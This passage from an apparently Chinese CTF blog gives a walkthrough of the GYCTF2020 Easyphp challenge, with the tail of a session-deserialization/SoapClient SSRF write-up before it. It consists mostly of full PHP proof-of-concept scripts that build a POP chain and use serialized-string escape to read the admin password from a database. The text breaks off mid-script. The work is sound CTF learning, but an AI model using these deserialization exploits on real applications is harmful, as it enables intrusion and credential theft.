<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091653.png" alt="img"><br>最后再使用implode将这个数组转化为字符串，但其中都没有触发过这个soap的__call方法<br>这里我们可以将变量b覆盖为call_user_func,令其在最后调用执行SoapClient，但是传入的b会被写入为数组形式，所以我们还需要一个函数将其释放出来，就是<br><code>extract()</code><br>它的主要作用是将数组展开，键名作为变量名，元素值为变量值</p>
<p>所以payload如下:</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721095814.png" alt="img" style="zoom:67%;">

<p>访问session=1（刚刚设置的）</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721095946.png" alt="img" style="zoom:67%;">

<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>1.session反序列化机制主要是利用session存储机制不同所造成的的漏洞<br>2.判别标准是：session是否开启，session_start函数是否可以被调用，是否存在多余参数可以用来控制session_handler。<br>3.可以利用soap内置类实现ssrf</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/18/GYCTF2020-Easyphp/">GYCTF2020-Easyphp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-18</time><div class="content"><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p><a target="_blank" rel="noopener" href="http://www.zip备份文件下载下来审计一下/">www.zip备份文件下载下来审计一下</a>~<br>有点好笑哈哈哈哈哈哈~</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718165402.png" alt="img" style="zoom:50%;">

<p>在lib.php中看到很多类和方法，盲猜就是需要反序列化，然后搜索了一下unserialize函数<br>发现在update函数中果然有这个函数。但是没看到传参的入口，于是再看看其他文件，发现：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718191702.png" alt="img" style="zoom:67%;"><br>包含了flag.php，回想到刚刚看到的file_get_contents~这不就呼应上了？不过还是要再继续看看，别等下走了歪路。。。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718191757.png" alt="img" style="zoom:67%;"></p>
<p>回到update.php中，我们可以发现，即使login!=1依旧会执行$users-&gt;update();，而这个函数在lib.php中，反序列化了getNewinfo()中的内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718193631.png" alt="img" style="zoom:67%;"><br>继续看getNewInfo()里面的内容，可以使用post传入age和nickname，实现参数的传入<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718193720.png" alt="img" style="zoom:67%;"><br>但是由于有个safe函数，所以我们直接通过file_get_contents包含是不太可能的==于是想想有没有其他，可以发现这个safe函数，他是通过将危险字符串换成hacker来达到过滤的目的，这样的话就意味着存在反序列化字符串逃逸的的风险<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718213518.png" alt="img" style="zoom:67%;"><br>继续查看一下他的整体代码逻辑，不难发现nickname和age会被插入在这里执行update操作：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719104918.png" alt="img" style="zoom:67%;"><br>我们的最终目标应该是修改admin的密码，使得我们可以登录，所以这里的update语句似乎也没有多大意义的亚子，于是我们看看其他地方能不能构造出一条链出来,如果我们可以是用login方法，它会创造一个新的类也就是dbCtrl，接下来就会执行查询的sql语句，但是查询结果似乎是只有回显id，我们需要的是密码，所以好像意义不太大？，继续往下看看</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719161103.png" alt="img" style="zoom:67%;">

<p>在user里面还有一个tostring，通常是用来做跳板的：当一个类被转换成字符串时被调用，update函数也是User里面的，所以应该是其他地方的跳回来这里吧，继续往下</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719161922.png" alt="img"></p>
<p>这是一个新的类，其中有一个call方法，即调用不可访问或不存在的方法时被调用，一般也是用来做跳板的，他最后是login的，login就两个地方，一个是dbCtrl，一个是User，要去哪个呢？，感觉应该是要去dbCtrl，为什么呢，继续往下看看<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719162319.png" alt="img"></p>
<p>这边echo了sql，应该是echo查询结果吧，echo输出的内容是字符串，所以应该是从这里开始起跳到User里面，</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719162618.png" alt="img" style="zoom:67%;">

<p>整理一下思路，从UpdateHelper中构造查询sql语句然后通过destruct将nickname赋值为Info类，调用info里面的call方法，并将ctrlcase赋值为dbCtrl使其使用login方法查询sql结果，</p>
<p>构造一下在本地调试一波看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;as119801222&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;security&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$b=<span class="keyword">new</span> User();</span><br><span class="line">$c=<span class="keyword">new</span> Info();</span><br><span class="line">$d=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$b-&gt;age=<span class="string">&quot;select password from users where username=&#x27;admin&#x27;&quot;</span>;</span><br><span class="line">$c-&gt;CtrlCase=$d;</span><br><span class="line">$b-&gt;nickname=$c;</span><br><span class="line">$a-&gt;sql=$b;</span><br><span class="line"><span class="keyword">echo</span> (serialize($a));</span><br><span class="line">unserialize(<span class="string">&quot;O:12:\&quot;UpdateHelper\&quot;:1:&#123;s:3:\&quot;sql\&quot;;O:4:\&quot;User\&quot;:3:&#123;s:2:\&quot;id\&quot;;N;s:3:\&quot;age\&quot;;s:49:\&quot;select password from users where username=&#x27;admin&#x27;\&quot;;s:8:\&quot;nickname\&quot;;O:4:\&quot;Info\&quot;:1:&#123;s:8:\&quot;CtrlCase\&quot;;O:6:\&quot;dbCtrl\&quot;:8:&#123;s:8:\&quot;hostname\&quot;;s:9:\&quot;localhost\&quot;;s:6:\&quot;dbuser\&quot;;s:4:\&quot;root\&quot;;s:6:\&quot;dbpass\&quot;;s:11:\&quot;as119801222\&quot;;s:8:\&quot;database\&quot;;s:8:\&quot;security\&quot;;s:4:\&quot;name\&quot;;N;s:8:\&quot;password\&quot;;N;s:6:\&quot;mysqli\&quot;;N;s:5:\&quot;token\&quot;;N;&#125;&#125;&#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>调试完以后是按照想象中的跳了，但是没出来密码？所以想说再构造一下试试看，试了几次都没出密码，于是看了一下wp，发现几件事，首先，idresult对应的是查询出来的第一个参数，所以我们的查询语句应该是select password,id from users where username=？<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719172049.jpg" alt="img"></p>
<p>其次 查询的对象也就是name的赋值需要在这里赋值:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719172204.png" alt="img" style="zoom:67%;"></p>
<p>所以改良以后的poc为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;as119801222&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;security&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$b=<span class="keyword">new</span> User();</span><br><span class="line">$c=<span class="keyword">new</span> Info();</span><br><span class="line">$d=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$d-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$b-&gt;age=<span class="string">&quot;select password,id from users where username=?&quot;</span>;</span><br><span class="line">$c-&gt;CtrlCase=$d;</span><br><span class="line">$b-&gt;nickname=$c;</span><br><span class="line">$a-&gt;sql=$b;</span><br><span class="line"><span class="comment">#echo (serialize($a));</span></span><br><span class="line">unserialize(<span class="string">&quot;O:12:\&quot;UpdateHelper\&quot;:1:&#123;s:3:\&quot;sql\&quot;;O:4:\&quot;User\&quot;:3:&#123;s:2:\&quot;id\&quot;;N;s:3:\&quot;age\&quot;;s:52:\&quot;select password,id from users where username=&#x27;admin&#x27;\&quot;;s:8:\&quot;nickname\&quot;;O:4:\&quot;Info\&quot;:1:&#123;s:8:\&quot;CtrlCase\&quot;;O:6:\&quot;dbCtrl\&quot;:8:&#123;s:8:\&quot;hostname\&quot;;s:9:\&quot;localhost\&quot;;s:6:\&quot;dbuser\&quot;;s:4:\&quot;root\&quot;;s:6:\&quot;dbpass\&quot;;s:11:\&quot;as119801222\&quot;;s:8:\&quot;database\&quot;;s:8:\&quot;security\&quot;;s:4:\&quot;name\&quot;;s:5:\&quot;admin\&quot;;s:8:\&quot;password\&quot;;N;s:6:\&quot;mysqli\&quot;;N;s:5:\&quot;token\&quot;;s:5:\&quot;admin\&quot;;&#125;&#125;&#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>由于以上的poc我连接的是本地的数据库来测试，所以后面需要改回去<br>接下来就是让这里的反序列化内容逃逸出去<br>这里说一下遇到的坑：<br>1.记得前面的内容要有引号闭合，后面要有花括号闭合<br>2.原本的反序列化内容还有个CtrlCase，我们的payload拼接进去以后会被挤到后面去就被丢掉了，所以需要在我们的payload之前加一下（在这里卡了很久无语了）</p>
<p>这是终极payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=<span class="string">&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\&quot;;O:12:\\\&quot;UpdateHelper\\\&quot;:1:&#123;s:3:\\\&quot;sql\\\&quot;;O:4:\\\&quot;User\\\&quot;:3:&#123;s:2:\\\&quot;id\\\&quot;;N;s:3:\\\&quot;age\\\&quot;;s:52:\\\&quot;select password,id from users where username = &#x27;admin&#x27;\\\&quot;;s:8:\\\&quot;nickname\\\&quot;;O:4:\\\&quot;Info\\\&quot;:1:&#123;s:8:\\\&quot;CtrlCase\\\&quot;;O:6:\\\&quot;dbCtrl\\\&quot;:8:&#123;s:8:\\\&quot;hostname\\\&quot;;s:9:\\\&quot;localhost\\\&quot;;s:6:\\\&quot;dbuser\\\&quot;;s:4:\\\&quot;root\\\&quot;;s:6:\\\&quot;dbpass\\\&quot;;s:11:\\\&quot;as119801222\\\&quot;;s:8:\\\&quot;database\\\&quot;;s:8:\\\&quot;security\\\&quot;;s:4:\\\&quot;name\\\&quot;;s:5:\\\&quot;admin\\\&quot;;s:8:\\\&quot;password\\\&quot;;N;s:6:\\\&quot;mysqli\\\&quot;;N;s:5:\\\&quot;token\\\&quot;;s:5:\\\&quot;admin\\\&quot;;&#125;&#125;&#125;&#125;&quot;</span>;</span><br><span class="line">        $nickname=<span class="string">&quot;11&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        $this-&gt;age=$age;</span></span><br><span class="line"><span class="comment">//        $this-&gt;nickname=$nickname;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 